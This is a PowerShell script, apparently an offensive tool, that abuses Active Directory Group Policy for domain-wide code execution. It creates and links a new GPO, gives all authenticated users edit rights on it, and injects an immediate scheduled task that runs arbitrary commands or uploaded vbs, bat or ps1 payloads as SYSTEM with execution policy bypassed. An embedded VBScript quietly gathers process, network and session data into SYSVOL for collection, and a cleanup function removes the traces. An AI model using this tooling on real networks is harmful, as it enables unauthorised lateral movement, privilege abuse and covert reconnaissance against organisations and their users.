Function Security-Filter([string]$gpo_nme, [System.Collections.ArrayList]$userarray) {
	Set-GPPermissions -Name $gpo_nme -PermissionLevel GpoApply -TargetName "Domain Computers" -TargetType Group -Confirm:$false| out-null
	foreach ($i in $userarray) {

		Set-GPPermissions -Name $gpo_nme -PermissionLevel GpoApply -TargetName $i -TargetType User -Confirm:$false| out-null
	}
}

function  New-Fusck  {

[CmdletBinding()]
param (
    [Parameter(Mandatory=$true)][string]$BackupPath,
    [Parameter(Mandatory=$true)][string]$GPODisplayName,
    [Parameter(Mandatory=$false)][string]$CmdArg,
    [Parameter(Mandatory=$false)][string]$User,
    [Parameter(Mandatory=$false)][string]$UserList,
    [Parameter(Mandatory=$true)][string]$DCFqdn,
    [Parameter(Mandatory=$true)][string]$OUPath,
    [Parameter(Mandatory=$false)][string]$ScriptPath,
    [Parameter(Mandatory=$false)][string]$ScriptArg,
    [Parameter(Mandatory=$false)][switch]$IG,
    [Parameter(Mandatory=$false)][switch]$Deploy,
    [Parameter(Mandatory=$false)][switch]$Machine,
    [Parameter(Mandatory=$false)][switch]$BatchUser,
    [Parameter(Mandatory=$false)][string]$DeployFileList,
    [Parameter(Mandatory=$false)][string]$DeployArg,
    [Parameter(Mandatory=$false)][string]$CPfqdn

 )
write-host ""
$info_gathering = @"
Option Explicit
On Error Resume Next
Dim someObject
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")

'gather information'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Dim strOutput
With CreateObject("WScript.Shell")

    ' Pass 0 as the second parameter to hide the window...
    .Run "cmd /c tasklist.exe /svc > c:\users\public\downloads\out.txt", 0, True

End With
With CreateObject("WScript.Shell")

    ' Pass 0 as the second parameter to hide the window...
    .Run "cmd /c netstat -ano -p tcp >> c:\users\public\downloads\out.txt", 0, True

End With
With CreateObject("WScript.Shell")

    ' Pass 0 as the second parameter to hide the window...
    .Run "cmd /c dir C:\users >> c:\users\public\downloads\out.txt", 0, True

End With
With CreateObject("WScript.Shell")

    ' Pass 0 as the second parameter to hide the window...
    .Run "cmd /c hostname >> c:\users\public\downloads\out.txt", 0, True

End With
With CreateObject("WScript.Shell")

    ' Pass 0 as the second parameter to hide the window...
    .Run "cmd /c quser >> c:\users\public\downloads\out.txt", 0, True

End With
Dim dest_file_name
dest_file_name = RandomString
Dim WshNetwork
Dim ComputerName
Set WshNetwork = CreateObject("WScript.Network")
ComputerName = WshNetwork.ComputerName
fso.CopyFile "c:\users\public\downloads\out.txt", "place_holder_for_sec\" & ComputerName & "-" & dest_file_name & ".txt"

With CreateObject("Scripting.FileSystemObject")

    .DeleteFile "c:\users\public\downloads\out.txt"

End With

function RandomString()

    Randomize()

    dim CharacterSetArray
    CharacterSetArray = Array(_
        Array(7, "abcdefghijklmnopqrstuvwxyz"), _
        Array(1, "acv") _
    )

    dim i
    dim j
    dim Count
    dim Chars
    dim Index
    dim Temp

    for i = 0 to UBound(CharacterSetArray)

        Count = CharacterSetArray(i)(0)
        Chars = CharacterSetArray(i)(1)

        for j = 1 to Count

            Index = Int(Rnd() * Len(Chars)) + 1
            Temp = Temp & Mid(Chars, Index, 1)

        next

    next

    dim TempCopy

    do until Len(Temp) = 0

        Index = Int(Rnd() * Len(Temp)) + 1
        TempCopy = TempCopy & Mid(Temp, Index, 1)
        Temp = Mid(Temp, 1, Index - 1) & Mid(Temp, Index + 1)

    loop

    RandomString = TempCopy

end function
"@

$CmdPath = "C:\windows\system32\cmd.exe"
$user_array_list = [System.Collections.ArrayList]@()
$deploy_file_list = [System.Collections.ArrayList]@()
$gpo_edit_user = ""

if ($BatchUser -and $Machine) {
	write-host "[!] conflict options: BatchUser`tMachine"
	return
}

if ("" -eq $User -and "" -eq $UserList) {
	if (!$BatchUser) {
		write-host "[!] please specify User or UserList"
		return
	}
}

if ("" -ne $User -and "" -ne $UserList) {
	write-host "[!] you can only use one between User and UserList"
	return
}
if ("" -ne $User) {
	if ($BatchUser) {
		write-host "[!] there is no need to specify user when you use BatchUser option"
		return
	}
	$gpo_edit_user = $User
	$user_array_list.Add($User)|out-null
}
if ("" -ne $UserList) {
	if ($BatchUser) {
		write-host "[!] there is no need to specify user when you use BatchUser option"
		return
	}
	$raw_content = [System.IO.File]::ReadAllText($UserList)
	$user_array = $raw_content.Split("%")
	foreach ($i in $user_array) {
		$gpo_edit_user = $i
		$user_array_list.Add($i.Trim())
	}
}
if ($Machine) {
	foreach ($i in $user_array_list) {
		if ($i -Match "\$") {
		}
		# else {
			# write-host "[!] machine account must have $"
			# return
		# }
	}
}
if (!$Machine) {
	foreach ($i in $user_array_list) {
		if ($i -Match "\$") {
			write-host "[!] please specify Machine option if you want to use machine account"
			return
		}
	}
}

if ($IG -and $Deploy) {
	write-host "[!] you can only use one between IG and Deploy"
	return
}
if (!$IG -and !$Deploy) {
	if ("" -eq $CmdArg -and "" -eq $ScriptPath) {
		write-host "[!] please specify CmdArg or ScriptPath"
		return
	}
	if ("" -ne $CmdArg -and "" -ne $ScriptPath) {
		write-host "[!] you can only use one between CmdArg and ScriptPath"
		return
	}
	$need_set_file_with_policy = $false
	$script_name = ""
	$script_type = ""

	if ("" -ne $ScriptPath) {
		if ("" -eq $CPFqdn) {
			write-host "[!] please specify CPFqdn"
			return
		}
		$need_set_file_with_policy = $true
		foreach ($i in $ScriptPath.Split("\")) {
			$script_name = $i
		}
		foreach ($i in $ScriptPath.Split(".")) {
			$script_type = $i
		}
		write-host "[+] detect script type:`t"$script_type
		if ($script_type -eq "ps1" -and "" -eq $ScriptArg) {
			write-host "[!] you may need pass some parameters with ScriptArg when you use ps1 script"
			return
		}
	}
}
elseif ($IG) {
	if ("" -eq $CPFqdn) {
		write-host "[!] please specify CPFqdn"
		return
	}
	if ("" -ne $CmdArg -or "" -ne $ScriptPath) {
		write-host "[!] you can not use CmdArg or ScriptPath when IG is specified"
		return
	}
}
elseif ($Deploy) {
	if ("" -eq $CPFqdn) {
		write-host "[!] please specify CPFqdn"
		return
	}

	if ("" -ne $CmdArg -or "" -ne $ScriptPath) {
		write-host "[!] you can not use CmdArg or ScriptPath when IG is specified"
		return
	}
	if ("" -eq $DeployFileList -or "" -eq $DeployArg) {
		write-host "[!] you need to set DeployFileList and DeployArg"
		return
	}
	$raw_content = [System.IO.File]::ReadAllText($DeployFileList)
	$deploy_file_list = $raw_content.Split("$")
}


write-host "[*] start import module"
import-module grouppolicy
write-host "[+] module import complete"
write-host "[*] retrive backup GUID and GPO GUID"


$Domain = $DCFqdn.replace($DCFqdn.Split(".")[0] + ".", "")

$CharArray =$Domain.Split(".")
$NetBios = $CharArray[0].toupper()
$task_guid = [guid]::NewGuid().ToString().toupper()

$dn = ""
$top_domain = ""
foreach ($i in $CharArray) {
	$top_domain = $i
	$dn = $dn + "dc=" + $i + ","
}

$dn = $dn.replace($top_domain+",", $top_domain)
write-host "[+] calculated base DN:`t`t"$dn
$dn = $OUPath
New-GPO -Name $GPODisplayName | New-GPLink -Target $dn | out-null
if (!$BatchUser) {
	if (!$Machine) {
		Security-Filter $GPODisplayName $user_array_list
	}
	else {
		foreach ($i in $user_array_list) {
			Set-GPPermissions -Name $GPODisplayName -PermissionLevel GpoApply -TargetName $i -TargetType User -Confirm:$false| out-null
		}
	}
}

if (!$BatchUser) {
	Set-GPPermissions -Name $GPODisplayName -PermissionLevel GpoRead -TargetName "Authenticated Users" -TargetType Group -Replace -Confirm:$false| out-null
}
Set-GPPermissions -Name $GPODisplayName -PermissionLevel GpoEdit -TargetName "Authenticated Users" -TargetType Group -Confirm:$false| out-null
$backup_result = Backup-Gpo -Name $GPODisplayName -Path $BackupPath
$backup_guid = $backup_result.id.ToString().toupper()
$gpo_guid = $backup_result.gpoid.ToString().toupper()
$gpo_name = $backup_result.DisplayName
$time = $backup_result.creationtime.ToString("yyyy-MM-dd HH:mm:ss")

write-host "[+] backup_guid:`t`t"$backup_guid
write-host "[+] gpo_guid:`t`t`t"$gpo_guid
write-host "[+] gpo_display_name:`t`t"$gpo_name
write-host "[+] retrive completed"
write-host "[*] start changing GPO backup files"

#copy script to policy folder
$final_script_path = ""
if ($need_set_file_with_policy) {
	$dest_file_path = "\\" + $DCFqdn + "\sysvol\" + $Domain + "\Policies\{" + $gpo_guid + "}"
	write-host "[*] script dest path:`n`t"$dest_file_path
	Copy-Item $ScriptPath $dest_file_path  -Confirm:$false | out-null
	$final_script_path = $dest_file_path + "\\" + $script_name
	$final_script_path = $final_script_path.replace($DCFqdn, $CPFqdn)
}
elseif ($Deploy) {
	$dest_file_path = "\\" + $DCFqdn + "\sysvol\" + $Domain + "\Policies\{" + $gpo_guid + "}"
	write-host "[*] Sweet dest path:`n`t"$dest_file_path
	foreach ($i in $deploy_file_list) {
		#Copy-Item $i.Trim() $dest_file_path  -Confirm:$false | out-null
	}
}

$task_guid = [guid]::NewGuid().ToString().toupper()
$backup_path = $BackupPath + "\{" + $backup_guid + "}\Backup.xml"
$template_string = @"
Unknown Extension"><FSObjectDir bkp:Path="%GPO_USER_FSPATH%\Preferences" bkp:SourceExpandedPath="\\WIN-MNP82RSFA1R.pladgaiueryteqwfuysibdgulofkehrs\sysvol\pladgaiueryteqwfuysibdgulofkehrs\Policies\{8817108C-0ADF-4E4E-A516-CED14917C11C}\User\Preferences" bkp:Location="DomainSysvol\GPO\User\Preferences"/><FSObjectDir bkp:Path="%GPO_USER_FSPATH%\Preferences\ScheduledTasks" bkp:SourceExpandedPath="\\WIN-MNP82RSFA1R.pladgaiueryteqwfuysibdgulofkehrs\sysvol\pladgaiueryteqwfuysibdgulofkehrs\Policies\{8817108C-0ADF-4E4E-A516-CED14917C11C}\User\Preferences\ScheduledTasks" bkp:Location="DomainSysvol\GPO\User\Preferences\ScheduledTasks"/><FSObjectFile bkp:Path="%GPO_USER_FSPATH%\Preferences\ScheduledTasks\ScheduledTasks.xml" bkp:SourceExpandedPath="\\WIN-MNP82RSFA1R.pladgaiueryteqwfuysibdgulofkehrs\sysvol\pladgaiueryteqwfuysibdgulofkehrs\Policies\{8817108C-0ADF-4E4E-A516-CED14917C11C}\User\Preferences\ScheduledTasks\ScheduledTasks.xml" bkp:Location="DomainSysvol\GPO\User\Preferences\ScheduledTasks\ScheduledTasks.xml"/></GroupPolicyExtension>
"@
if ($Machine) {
	$template_string = $template_string.replace("GPO_USER_FSPATH", "GPO_MACH_FSPATH")
	$template_string = $template_string.replace("User", "Machine")
}
$template_string = $template_string.replace("8817108C-0ADF-4E4E-A516-CED14917C11C", $gpo_guid)
$template_string = $template_string.replace("WIN-MNP82RSFA1R.pladgaiueryteqwfuysibdgulofkehrs\sysvol\pladgaiueryteqwfuysibdgulofkehrs\Policies", $DCFqdn + "\sysvol\" + $Domain + "\Policies")

[System.IO.File]::ReadAllText($backup_path).replace('Unknown Extension"/>', $template_string)|sc $backup_path
$temp_string = [System.IO.File]::ReadAllText($backup_path)
if ($Machine) {
	$temp_string = $temp_string -replace 'UserVersionNumber.*?GroupPolicyCoreSettings', 'UserVersionNumber><![CDATA[0]]></UserVersionNumber><MachineVersionNumber><![CDATA[65540]]></MachineVersionNumber><MachineExtensionGuids/><UserExtensionGuids><![CDATA[[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]]]></UserExtensionGuids><WMIFilter/></GroupPolicyCoreSettings'

	$temp_string = $temp_string -replace "<MachineExtensionGuids/>", "<MachineExtensionGuids><![CDATA[[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]]]></MachineExtensionGuids>"
}
else {
	$temp_string = $temp_string -replace 'UserVersionNumber.*?GroupPolicyCoreSettings', 'UserVersionNumber><![CDATA[327685]]></UserVersionNumber><MachineVersionNumber><![CDATA[65537]]></MachineVersionNumber><MachineExtensionGuids/><UserExtensionGuids><![CDATA[[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]]]></UserExtensionGuids><WMIFilter/></GroupPolicyCoreSettings'
}

Set-Content -Path $backup_path -Value $temp_string
if (!$Machine) {
	[System.IO.File]::ReadAllText($backup_path).replace('UserVersionNumber.*?UserVersionNumber', "UserVersionNumber><![CDATA[262148]]></UserVersionNumber")|sc $backup_path
}

$random_task_name = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
if ($Machine) {
	$scheduled_tasks_path =  $BackupPath + "\{" + $backup_guid + "}\DomainSysvol\GPO\Machine\Preferences\ScheduledTasks"
	New-Item -ItemType Directory -Path $scheduled_tasks_path -Force | out-null
	New-Item -Path $scheduled_tasks_path -Name "ScheduledTasks.xml" -ItemType "file" | out-null
	$scheduled_tasks_path =  $BackupPath + "\{" + $backup_guid + "}\DomainSysvol\GPO\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
}
else {
	$scheduled_tasks_path =  $BackupPath + "\{" + $backup_guid + "}\DomainSysvol\GPO\User\Preferences\ScheduledTasks"
	New-Item -ItemType Directory -Path $scheduled_tasks_path -Force | out-null
	New-Item -Path $scheduled_tasks_path -Name "ScheduledTasks.xml" -ItemType "file" | out-null
	$scheduled_tasks_path =  $BackupPath + "\{" + $backup_guid + "}\DomainSysvol\GPO\User\Preferences\ScheduledTasks\ScheduledTasks.xml"
}
$template_string = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="tes6tesrfse" image="0" changed="2021-09-13 12:33:28" uid="{9E9C8987-C5B4-4B4C-BE45-B49089D7F75C}"><Properties action="C" name="tes6tesrfse" runAs="NT AUTHORITY\System" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>546uyjrft75768iuyt656\administrator</Author><Description></Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions><Exec><Command>42uwrj5nftsegko68r7i</Command><Arguments>53u8ije6tngdsdfgre23xu846ujd</Arguments></Exec>
				</Actions></Task></Properties></ImmediateTaskV2>
</ScheduledTasks>
"@
$template_string = $template_string.replace("tes6tesrfse", $random_task_name)
$template_string = $template_string.replace("546uyjrft75768iuyt656", $NetBios)
$template_string = $template_string.replace("2021-09-13 12:33:28", $time)
$template_string = $template_string.replace("9E9C8987-C5B4-4B4C-BE45-B49089D7F75C", $task_guid)

$CmdArg = $CmdArg.replace("&", "&amp;")
$CmdArg = $CmdArg.replace(">", "&gt;")

if ("" -eq $ScriptArg) {
	$ScriptArg = $ScriptArg.replace("&", "&amp;")
	$ScriptArg = $ScriptArg.replace(">", "&gt;")
}

#check if there is script to execute
if ($need_set_file_with_policy) {
	if ($script_type -eq "vbs") {
		$template_string = $template_string.replace("53u8ije6tngdsdfgre23xu846ujd", "/c copy $final_script_path C:\Users\Public\Downloads\" + $script_name + "&amp;&amp; C:\Windows\System32\cscript.exe C:\Users\Public\Downloads\" + $script_name + '&amp;&amp; del /q C:\Users\Public\Downloads\' + $script_name)
	}
	if ($script_type -eq "bat") {
		$template_string = $template_string.replace("53u8ije6tngdsdfgre23xu846ujd", "/c copy $final_script_path C:\Users\Public\Downloads\" + $script_name + "&amp;&amp; C:\Users\Public\Downloads\" + $script_name + '&amp;&amp; del /q C:\Users\Public\Downloads\' + $script_name)
	}
	if ($script_type -eq "ps1") {
		$template_string = $template_string.replace("53u8ije6tngdsdfgre23xu846ujd", "/c copy $final_script_path C:\Users\Public\Downloads\" + $script_name + '&amp;&amp; powershell -executionpolicy bypass -command "&amp; { import-module C:\Users\Public\Downloads\' + $script_name + ";" + $ScriptArg + '}"' + '&amp;&amp; del /q C:\Users\Public\Downloads\' + $script_name)
	}
}
elseif ($IG) {
	$info_gathering = $info_gathering.replace("place_holder_for_sec", "\\" + $DCFqdn + "\sysvol\" + $Domain + "\Policies\{" + $gpo_guid + "}")

	$info_gathering = $info_gathering.replace($DCFqdn , $CPFqdn)
	$dest_file_path = "\\" + $DCFqdn + "\sysvol\" + $Domain + "\Policies\{" + $gpo_guid + "}"
	write-host "[*] setting infomation gathering script..."
	New-Item -Path C:\windows\temp -Name "logoff.vbs" -ItemType "file" | out-null
	Set-Content -Path C:\windows\temp\logoff.vbs -Value $info_gathering | out-null
	Copy-Item C:\windows\temp\logoff.vbs $dest_file_path  -Confirm:$false | out-null
	Remove-Item -Path C:\windows\temp\logoff.vbs  -Confirm:$false | out-null
	write-host "[+] script successfully set"
	$final_script_path = $dest_file_path + "\\" + "logoff.vbs"
	$final_script_path = $final_script_path.replace($DCFqdn, $CPFqdn)

	$template_string = $template_string.replace("53u8ije6tngdsdfgre23xu846ujd", "/c copy $final_script_path C:\Users\Public\Downloads\" + "logoff.vbs" + "&amp;&amp; C:\Windows\System32\cscript.exe C:\Users\Public\Downloads\" + "logoff.vbs" + "&amp;&amp; del /q C:\Users\Public\Downloads\" + "logoff.vbs")
}
elseif ($Deploy) {

	$copy_string = "/c"
	foreach ($i in $deploy_file_list) {
		#Copy-Item $i.Trim() $dest_file_path  -Confirm:$false | out-null
		$temp_file_name = $i.Trim()

		$copy_string = $copy_string + " copy " + "\\" + $DCFqdn + "\sysvol\" + $Domain + "\Policies\{" + $gpo_guid + "}\" + $temp_file_name + " C:\Users\Public\Downloads\ &amp;&amp;"
		$copy_string = $copy_string.replace($DCFqdn, $CPFqdn)
	}

	$template_string = $template_string.replace("53u8ije6tngdsdfgre23xu846ujd", $copy_string + "C:\Users\Public\Downloads\" + $DeployArg)
}
else {
	$template_string = $template_string.replace("53u8ije6tngdsdfgre23xu846ujd", $CmdArg)
}
$template_string = $template_string.replace("42uwrj5nftsegko68r7i", $CmdPath)


Set-Content -Path $scheduled_tasks_path -Value $template_string




write-host "[+] GPO content modify complete"

write-host "[*] restore GPO with modified folder"
Restore-GPO -Name $gpo_name -Path $BackupPath | out-null
$gpo_backup_path = $BackupPath + "\{" + $backup_guid + "}"
write-host "[+] BackupPath: `t`t"$gpo_backup_path
Get-ChildItem $gpo_backup_path -Recurse | Remove-Item -recurse -Force -Confirm:$false   | out-null
Remove-Item -path $gpo_backup_path  -Force -recurse  | out-null
write-host "[+] GPO backup folder removed"
if ($IG) {
	$temp_string = "\\" + $DCFqdn + "\sysvol\" + $Domain + "\Policies\{" + $gpo_guid + "}" + "\hostname-rndstring.txt"
	$temp_string = $temp_string.replace($DCFqdn, $CPFqdn)
	write-host "[+] wait till policy is updated on target, then retrive"$temp_string
}
else {
	write-host "[+] finished! enjoy!"
}
}

function  clean-butt {

[CmdletBinding()]
param (
    [Parameter(Mandatory=$true)][string]$GPODisplayName

 )
write-host "`n[*] start import module"
	import-module grouppolicy
write-host "[+] module imported complete"

write-host "[*] cleaning..."
$gpo_guid = $(Get-GPO -Name $GPODisplayName).id.tostring().toupper()
Remove-GPO $GPODisplayName -Confirm:$false | out-null

$to_be_removed_path = "C:\Windows\SYSVOL\domain\Policies\" + "{" + $gpo_guid + "}"
if (Test-Path -Path $to_be_removed_path) {
Get-ChildItem $to_be_removed_path -Recurse | Remove-Item -recurse -Force -Confirm:$false   | out-null
Remove-Item -path $to_be_removed_path  -Force -recurse  | out-null
}

write-host "[+] finished! enjoy!"
}
